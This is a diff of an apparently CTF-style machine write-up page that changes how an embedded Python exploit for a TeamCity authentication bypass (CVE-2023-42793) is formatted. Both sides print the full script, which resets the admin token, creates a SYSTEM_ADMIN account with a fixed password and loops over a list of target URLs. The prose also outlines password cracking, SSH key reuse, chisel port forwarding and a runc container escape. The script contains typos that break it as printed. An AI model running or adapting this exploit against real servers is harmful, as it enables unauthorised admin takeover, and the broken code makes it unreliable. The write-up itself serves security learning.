@@ -92,142 +92,213 @@ How it works:
   <li>Token Deletion: The script initiates a DELETE request to remove the user token associated the default user.</li>
   <li>Token Creation: Upon successful token deletion, a new user token is created for the same default user.</li>
   <li>User creation: Using the newly generated token, the script then creates a new user with administrative privileges.</li>
-  <li>Output: Successful exploit are reported, and the compromised URLs are appended to a file ‘vulnerable.txt’
-<br /><br />
-```python
-#To generate ramdon names
-import random
-#To send http requests
-import requests
-#To analyze arguments 
-import argparse
-#To process xml responses
-import xml.etree.Element ar ET</li>
+  <li>Output: Successful exploit are reported, and the compromised URLs are appended to a file ‘vulnerable.txt’.</li>
 </ol>
 
-<p>#Define color 
-Color_Off=”\033[0m”
-Black = “\033[0;30m”
-Red= “\033[0;31m”
-Green= “\033[0;32m”
-Yellow= “\033[0;33m”
-Blue= “\033[0;34m”
-Purple= “\033[0;35m”</p>
+<p><br /><br /></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#To generate ramdon names
+</span><span class="kn">import</span> <span class="nn">random</span>
+<span class="c1">#To send http requests
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="c1">#To analyze arguments 
+</span><span class="kn">import</span> <span class="nn">argparse</span>
+<span class="c1">#To process xml responses
+</span><span class="kn">import</span> <span class="nn">xml.etree.Element</span> <span class="n">ar</span> <span class="n">ET</span>
 
-<p>class CVE_2023_42793:
-	#Create the constructor
-	def <strong>init</strong>(self):
-		#Url 
-		self.url=””
-		#Http request session
-		self.session = request.session()</p>
+<span class="c1">#Define color 
+</span><span class="n">Color_Off</span><span class="o">=</span><span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+<span class="n">Black</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;30m"</span>
+<span class="n">Red</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;31m"</span>
+<span class="n">Green</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;32m"</span>
+<span class="n">Yellow</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;33m"</span>
+<span class="n">Blue</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;34m"</span>
+<span class="n">Purple</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;35m"</span>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def username(self):
-	name = "H454NSec"
-	random_id = random.randint(1000,9999)
-	return f"{name}{random_id}"
-
-def delete_user_token(self, url)
-	self.url = url
-	headers = {
-		"User-Agent":"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
-		"Content-Type":"application/x-www-form-urlencoded",
-		"Accept-Encoding":"gzip, deflate"
-		}
-	try:
-		#Send a request to delete the user token
-		response = self.session.delete(f"{self.url}/app/rest/users/id:1/tokens/RPC2", headers=headers, timeout=10)
-		#If the answer is successful
-		if response.status_code == 204 or response.status_code == 404:
-			self.create_user_token()
+<span class="k">class</span> <span class="nc">CVE_2023_42793</span><span class="p">:</span>
+	<span class="c1">#Create the constructor
+</span>	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="c1">#Url 
+</span>		<span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="o">=</span><span class="s">""</span>
+		<span class="c1">#Http request session
+</span>		<span class="bp">self</span><span class="p">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
 		
-	except Exception as err:
-		pass
-		
-def create_user_token(self):
-	headers = {
-		"User-Agent":"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
-		"Accept-Encoding":"gzip, deflate"
-	}
-	try:
-		#send a post request to create a new token
-		response = self.session.post(f"{self.url}/app/rest/users/id:1/tokens/RPC2")
-		#If the answer is successful extract token value
-		#And create a new user
-		if response.status_code == 200:
-			response_text = response.text
-			root = ET.fromstring(response_text)
-			value = root.get('value')
-			#RFC 751 open standar
-			if value.startswith('eyJ0eXAiOiAiVENWMiJ9'):
-				self.create_user(value)
-	except Exception as err:
-		pass
-		
-def create_user(self, token):
-	uname = self.username()
-	headers = {
-	"User-Agent": "Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
- "Accept": "*/*",
- "Authorization": f"Bearer {token}",
- "Content-Type": "application/json",
-	}
-	creds = {
-		"email": "",
-		"username": uname,
-		"password": "@H454NSec",
-		"roles": {
-			"role": [{"roleId": "SYSTEM_ADMIN",
-			"scope": "g"}]
-		}
-	}
-	try:
-		#Senfd a post request
-		response = self.session.post(f"{self.url}/app/rest/users", headers=headers, json=creds, timeout=10)
-		#if the response is successful
-		if response.status_code == 200:
-			print(f"{Green}[+] {Yellow}{self.url}/login.html {Green}[{uname}:@H454NSec]{Color_Off}")
-			with open(vul.txt,"a") as o:
-				o.write(f"[{uname}:@H454NSec] {self.url}\n")
-	except Exception as err:
-		pass
-#if the script is execute independiently if __name__ == '__main__':
-#Create an object to analize arguments on 
-#command line
-parser = argparse.ArgumentParser()
-parser.add_argument('-u', '--url', help='Url of the web app')
-parser.add_argument('-l', '--list', help='List of urls')
-#Analyze arguments
-args = parser.parse_args()
-
-#Array to save list of url's
-db = []
-url_list = args.list
-
-if url_list:
-	try:
-		with open(url_list, "r") as fr:
-		#Read every line on the file
-			for data in fr.readlines():
-				#Delete blank spaces
-				db.append(data.strip())
-	except Exception as err:
-		print(err)
-
-elif args.url:
-	db.append(args.url)
-#Instantiate an object to use it
-cve = CVE_2023_42793()
-for ip in db:
-	#Delete the last slash if it is present
-	url = ip[:-1] if ip.endswitch("/") else ip
-	#Add http is it is not present
-	if not url.startswitch("http://"):
-		if not url.startswitch("http://"):
-			url = f"http://{url}"
-	cve.delete_user_token(url) ``` &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_6.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_7.png) &lt;br/&gt;&lt;br/&gt; We can create new projects here, this input is no sanitized but needs some files to recognize it as a repository &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_8.png) &lt;br/&gt;&lt;br/&gt; There are some users which can be useful to enumerate users &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_9.png) &lt;br/&gt;&lt;br/&gt; Beautiful thing happens on backup section, where we can download the .zip associated to the backup &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_10.png) &lt;br/&gt;&lt;br/&gt; There we realize that there are some credentials, with a cryptographic algorithm defined in a column  &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_11.png) &lt;br/&gt;&lt;br/&gt; We crack Andrew password, it was possible due to Andrew has a insecure password &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_12.png) &lt;br/&gt;&lt;br/&gt; We could think that password will be helpful to move forward which is right but first we need get into ssh but those credentials were no useful, so we dig a little more inside and we could find a private key &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_13.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_14.png) &lt;br/&gt;&lt;br/&gt; 3.Priv esc &lt;br/&gt;&lt;br/&gt; We actually don’t have credentials so sudo -l is no possible to execute it, but we can use linpeas to enumerate the whole system. &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_15.png) &lt;br/&gt;&lt;br/&gt; We can see a service running locally with the localport. We proceed to port forwarding using chisel &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_16.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_17.png) &lt;br/&gt;&lt;br/&gt; Again there is a log in interface, this time we tried with Andrew credentials. &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_18.png) &lt;br/&gt;&lt;br/&gt; The services allows to create containers and manage them &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_19.png) &lt;br/&gt;&lt;br/&gt; This version has a vulnerability which we can exploit it through container creation process &lt;br/&gt;&lt;br/&gt; - CVE-2024-21626 &lt;br/&gt;&lt;br/&gt;
-runc is a CLI(command line interface) tool for spawning and running containers on Linux according to the OCI(Open Container Initiative). In runc 1.1.11 and earlier, due to an internal file descriptor (Resources which are used access files) leak, an attacker could cause a newly-spawned container process (from runc exec) to have a working directory in the host filesystem namespace, allowing for a container escape by giving access to the host filesystem. The same attack could be used by a malicious image to allow a container process to gain access to the host filesystem through runc. Variants of these attacks could be also be used to overwrite semi-arbitrary host binaries, allowing for complete container escapes. &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_20.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_21.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_22.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_23.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_24.png) &lt;br/&gt;&lt;br/&gt; Machine pwned@W &lt;script src="/assets/js/matrix-overlay.js"&gt;&lt;/script&gt;
+	<span class="k">def</span> <span class="nf">username</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="n">name</span> <span class="o">=</span> <span class="s">"H454NSec"</span>
+		<span class="n">random_id</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
+		<span class="k">return</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">name</span><span class="si">}{</span><span class="n">random_id</span><span class="si">}</span><span class="s">"</span>
+	
+	<span class="k">def</span> <span class="nf">delete_user_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
+		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0"</span><span class="p">,</span>
+			<span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"application/x-www-form-urlencoded"</span><span class="p">,</span>
+			<span class="s">"Accept-Encoding"</span><span class="p">:</span><span class="s">"gzip, deflate"</span>
+			<span class="p">}</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="c1">#Send a request to delete the user token
+</span>			<span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">delete</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users/id:1/tokens/RPC2"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+			<span class="c1">#If the answer is successful
+</span>			<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">204</span> <span class="ow">or</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
+				<span class="bp">self</span><span class="p">.</span><span class="n">create_user_token</span><span class="p">()</span>
+			
+		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+			<span class="k">pass</span>
+			
+	<span class="k">def</span> <span class="nf">create_user_token</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0"</span><span class="p">,</span>
+			<span class="s">"Accept-Encoding"</span><span class="p">:</span><span class="s">"gzip, deflate"</span>
+		<span class="p">}</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="c1">#send a post request to create a new token
+</span>			<span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users/id:1/tokens/RPC2"</span><span class="p">)</span>
+			<span class="c1">#If the answer is successful extract token value
+</span>			<span class="c1">#And create a new user
+</span>			<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+				<span class="n">response_text</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>
+				<span class="n">root</span> <span class="o">=</span> <span class="n">ET</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">response_text</span><span class="p">)</span>
+				<span class="n">value</span> <span class="o">=</span> <span class="n">root</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'value'</span><span class="p">)</span>
+				<span class="c1">#RFC 751 open standar
+</span>				<span class="k">if</span> <span class="n">value</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'eyJ0eXAiOiAiVENWMiJ9'</span><span class="p">):</span>
+					<span class="bp">self</span><span class="p">.</span><span class="n">create_user</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+			<span class="k">pass</span>
+			
+	<span class="k">def</span> <span class="nf">create_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
+		<span class="n">uname</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="p">()</span>
+		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0"</span><span class="p">,</span>
+     <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"*/*"</span><span class="p">,</span>
+     <span class="s">"Authorization"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+     <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">,</span>
+		<span class="p">}</span>
+		<span class="n">creds</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">"email"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
+			<span class="s">"username"</span><span class="p">:</span> <span class="n">uname</span><span class="p">,</span>
+			<span class="s">"password"</span><span class="p">:</span> <span class="s">"@H454NSec"</span><span class="p">,</span>
+			<span class="s">"roles"</span><span class="p">:</span> <span class="p">{</span>
+				<span class="s">"role"</span><span class="p">:</span> <span class="p">[{</span><span class="s">"roleId"</span><span class="p">:</span> <span class="s">"SYSTEM_ADMIN"</span><span class="p">,</span>
+				<span class="s">"scope"</span><span class="p">:</span> <span class="s">"g"</span><span class="p">}]</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="c1">#Senfd a post request
+</span>			<span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">creds</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+			<span class="c1">#if the response is successful
+</span>			<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+				<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">Green</span><span class="si">}</span><span class="s">[+] </span><span class="si">{</span><span class="n">Yellow</span><span class="si">}{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/login.html </span><span class="si">{</span><span class="n">Green</span><span class="si">}</span><span class="s">[</span><span class="si">{</span><span class="n">uname</span><span class="si">}</span><span class="s">:@H454NSec]</span><span class="si">{</span><span class="n">Color_Off</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+				<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">vul</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">o</span><span class="p">:</span>
+					<span class="n">o</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"[</span><span class="si">{</span><span class="n">uname</span><span class="si">}</span><span class="s">:@H454NSec] </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+			<span class="k">pass</span>
+	<span class="c1">#if the script is execute independiently
+</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="c1">#Create an object to analize arguments on 
+</span>	<span class="c1">#command line
+</span>	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-u'</span><span class="p">,</span> <span class="s">'--url'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Url of the web app'</span><span class="p">)</span>
+	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-l'</span><span class="p">,</span> <span class="s">'--list'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'List of urls'</span><span class="p">)</span>
+	<span class="c1">#Analyze arguments
+</span>	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+	
+	<span class="c1">#Array to save list of url's
+</span>	<span class="n">db</span> <span class="o">=</span> <span class="p">[]</span>
+	<span class="n">url_list</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="nb">list</span>
+	
+	<span class="k">if</span> <span class="n">url_list</span><span class="p">:</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">url_list</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fr</span><span class="p">:</span>
+			<span class="c1">#Read every line on the file
+</span>				<span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">fr</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
+					<span class="c1">#Delete blank spaces
+</span>					<span class="n">db</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
+		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+			<span class="k">print</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+	
+	<span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">:</span>
+		<span class="n">db</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+	<span class="c1">#Instantiate an object to use it
+</span>	<span class="n">cve</span> <span class="o">=</span> <span class="n">CVE_2023_42793</span><span class="p">()</span>
+	<span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">db</span><span class="p">:</span>
+		<span class="c1">#Delete the last slash if it is present
+</span>		<span class="n">url</span> <span class="o">=</span> <span class="n">ip</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="n">ip</span><span class="p">.</span><span class="n">endswitch</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span> <span class="k">else</span> <span class="n">ip</span>
+		<span class="c1">#Add http is it is not present
+</span>		<span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">startswitch</span><span class="p">(</span><span class="s">"http://"</span><span class="p">):</span>
+			<span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">startswitch</span><span class="p">(</span><span class="s">"http://"</span><span class="p">):</span>
+				<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">"</span>
+		<span class="n">cve</span><span class="p">.</span><span class="n">delete_user_token</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 </code></pre></div></div>
+<p><br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_6.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_7.png" alt="Untitled" />
+<br /><br />
+We can create new projects here, this input is no sanitized but needs some files to recognize it as a repository
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_8.png" alt="Untitled" />
+<br /><br />
+There are some users which can be useful to enumerate users
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_9.png" alt="Untitled" />
+<br /><br />
+Beautiful thing happens on backup section, where we can download the .zip associated to the backup
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_10.png" alt="Untitled" />
+<br /><br />
+There we realize that there are some credentials, with a cryptographic algorithm defined in a column 
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_11.png" alt="Untitled" />
+<br /><br />
+We crack Andrew password, it was possible due to Andrew has a insecure password
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_12.png" alt="Untitled" />
+<br /><br />
+We could think that password will be helpful to move forward which is right but first we need get into ssh but those credentials were no useful, so we dig a little more inside and we could find a private key
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_13.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_14.png" alt="Untitled" />
+<br /><br />
+3.Priv esc
+<br /><br />
+We actually don’t have credentials so sudo -l is no possible to execute it, but we can use linpeas to enumerate the whole system.
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_15.png" alt="Untitled" />
+<br /><br />
+We can see a service running locally with the localport. We proceed to port forwarding using chisel
+<br /><br />
+<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_16.png" alt="Untitled" />
+<br /><br />
